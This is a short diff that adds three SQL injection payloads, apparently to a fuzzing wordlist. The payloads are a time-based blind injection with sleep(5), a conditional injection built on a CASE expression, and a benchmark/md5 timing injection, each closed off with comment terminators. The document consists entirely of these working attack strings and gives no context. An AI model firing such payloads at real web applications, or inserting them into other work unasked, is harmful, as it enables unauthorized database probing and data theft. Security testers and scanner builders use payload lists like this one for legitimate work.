@@ -1,0 +1,3 @@
+1))) rlike (select * from (select(sleep(5)))vwyq)#
+1)) as zldh where 3302=3302 rlike (select (case when (1481=5677) then 1 else 0x28 end))--
+1') where 6634=6634 or 8466=benchmark(5000000,md5(0x694a4745))--
